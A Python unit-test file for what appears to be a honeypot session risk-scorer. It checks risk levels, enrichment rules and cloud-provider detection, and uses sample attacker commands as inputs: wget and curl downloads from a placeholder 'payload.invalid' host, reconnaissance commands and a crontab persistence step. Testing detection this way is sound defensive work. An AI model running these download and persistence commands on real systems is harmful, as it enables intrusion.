from __future__ import annotations

import unittest

from risk.rules import RiskLevel
from risk.scoring import (
    SessionRiskInput,
    command_matches,
    evaluate_session,
    is_cloud_provider,
)


class RiskScoringTests(unittest.TestCase):
    def test_low_assessment(self) -> None:
        assessment = evaluate_session(
            SessionRiskInput(
                session_key="sensor:low",
                has_successful_login=True,
                has_download=False,
                usernames=("root",),
            )
        )

        self.assertEqual(assessment.score, 15)
        self.assertEqual(assessment.risk_level, RiskLevel.LOW)

    def test_medium_assessment(self) -> None:
        assessment = evaluate_session(
            SessionRiskInput(
                session_key="sensor:medium",
                has_successful_login=False,
                has_download=True,
                commands=("wget http://payload.invalid/file",),
            )
        )

        self.assertEqual(assessment.score, 35)
        self.assertEqual(assessment.risk_level, RiskLevel.MEDIUM)

    def test_high_assessment(self) -> None:
        assessment = evaluate_session(
            SessionRiskInput(
                session_key="sensor:high",
                has_successful_login=True,
                has_download=True,
                usernames=("root",),
                commands=("whoami", "curl http://payload.invalid/file"),
            )
        )

        self.assertEqual(assessment.score, 60)
        self.assertEqual(assessment.risk_level, RiskLevel.HIGH)

    def test_critical_assessment(self) -> None:
        assessment = evaluate_session(
            SessionRiskInput(
                session_key="sensor:critical",
                has_successful_login=True,
                has_download=True,
                usernames=("root",),
                commands=(
                    "whoami",
                    "wget http://payload.invalid/file",
                    "crontab -e",
                ),
            )
        )

        self.assertEqual(assessment.score, 85)
        self.assertEqual(assessment.risk_level, RiskLevel.CRITICAL)
        self.assertEqual(len(assessment.reasons), 6)

    def test_repeated_commands_do_not_repeat_rule_weight(self) -> None:
        assessment = evaluate_session(
            SessionRiskInput(
                session_key="sensor:repeat",
                has_successful_login=False,
                has_download=False,
                commands=("whoami", "id", "uname -a"),
            )
        )

        self.assertEqual(assessment.score, 10)
        self.assertEqual(len(assessment.reasons), 1)

    def test_short_command_pattern_respects_token_boundaries(self) -> None:
        self.assertTrue(command_matches("id", "id"))
        self.assertTrue(command_matches("echo x; id", "id"))
        self.assertFalse(command_matches("chmod +x payload", "id"))

    def test_empty_session_has_zero_low_score(self) -> None:
        assessment = evaluate_session(
            SessionRiskInput(
                session_key="sensor:empty",
                has_successful_login=False,
                has_download=False,
            )
        )

        self.assertEqual(assessment.score, 0)
        self.assertEqual(assessment.risk_level, RiskLevel.LOW)
        self.assertEqual(assessment.reasons, ())


class EnrichmentScoringTests(unittest.TestCase):
    def _base_input(self, **overrides) -> SessionRiskInput:
        kwargs: dict = dict(
            session_key="sensor:enrich",
            has_successful_login=False,
            has_download=False,
            vt_malicious_hashes=0,
            is_cloud_origin=False,
        )
        kwargs.update(overrides)
        return SessionRiskInput(**kwargs)

    def test_malicious_hash_triggers_rule(self) -> None:
        session = self._base_input(vt_malicious_hashes=1)
        assessment = evaluate_session(session)
        rule_ids = {r.rule_id for r in assessment.reasons}
        self.assertIn("malicious_hash_reputation", rule_ids)
        self.assertEqual(assessment.score, 20)

    def test_no_vt_data_does_not_trigger_rule(self) -> None:
        session = self._base_input(vt_malicious_hashes=0)
        assessment = evaluate_session(session)
        rule_ids = {r.rule_id for r in assessment.reasons}
        self.assertNotIn("malicious_hash_reputation", rule_ids)

    def test_cloud_origin_triggers_rule(self) -> None:
        session = self._base_input(is_cloud_origin=True)
        assessment = evaluate_session(session)
        rule_ids = {r.rule_id for r in assessment.reasons}
        self.assertIn("cloud_origin", rule_ids)
        self.assertEqual(assessment.score, 10)

    def test_no_cloud_origin_does_not_trigger_rule(self) -> None:
        session = self._base_input(is_cloud_origin=False)
        assessment = evaluate_session(session)
        rule_ids = {r.rule_id for r in assessment.reasons}
        self.assertNotIn("cloud_origin", rule_ids)

    def test_both_enrichments_add_to_score(self) -> None:
        session = self._base_input(vt_malicious_hashes=3, is_cloud_origin=True)
        assessment = evaluate_session(session)
        rule_ids = {r.rule_id for r in assessment.reasons}
        self.assertIn("malicious_hash_reputation", rule_ids)
        self.assertIn("cloud_origin", rule_ids)
        self.assertEqual(assessment.score, 30)  # 20 + 10

    def test_score_cap_enforced_with_all_signals(self) -> None:
        session = SessionRiskInput(
            session_key="sensor:cap",
            has_successful_login=True,
            has_download=True,
            usernames=("root",),
            commands=("whoami", "wget http://x.invalid/f", "crontab -e"),
            vt_malicious_hashes=5,
            is_cloud_origin=True,
        )
        assessment = evaluate_session(session)
        self.assertLessEqual(assessment.score, 100)

    def test_malicious_count_is_in_evidence(self) -> None:
        session = self._base_input(vt_malicious_hashes=7)
        assessment = evaluate_session(session)
        vt_reason = next(
            (r for r in assessment.reasons if r.rule_id == "malicious_hash_reputation"),
            None,
        )
        self.assertIsNotNone(vt_reason)
        assert vt_reason is not None
        self.assertTrue(any("7" in e for e in vt_reason.evidence))


class CloudDetectionTests(unittest.TestCase):
    def test_amazon_isp_is_cloud(self) -> None:
        self.assertTrue(is_cloud_provider("Amazon.com Inc.", None))

    def test_aws_in_asn_is_cloud(self) -> None:
        self.assertTrue(is_cloud_provider(None, "AS16509 Amazon.com Inc."))

    def test_google_cloud_isp_is_cloud(self) -> None:
        self.assertTrue(is_cloud_provider("Google LLC", None))

    def test_digitalocean_isp_is_cloud(self) -> None:
        self.assertTrue(is_cloud_provider("DigitalOcean LLC", None))

    def test_residential_isp_is_not_cloud(self) -> None:
        self.assertFalse(is_cloud_provider("Comcast Cable", "AS7922 Comcast"))

    def test_none_isp_and_asn_is_not_cloud(self) -> None:
        self.assertFalse(is_cloud_provider(None, None))

    def test_empty_strings_are_not_cloud(self) -> None:
        self.assertFalse(is_cloud_provider("", ""))


if __name__ == "__main__":
    unittest.main()
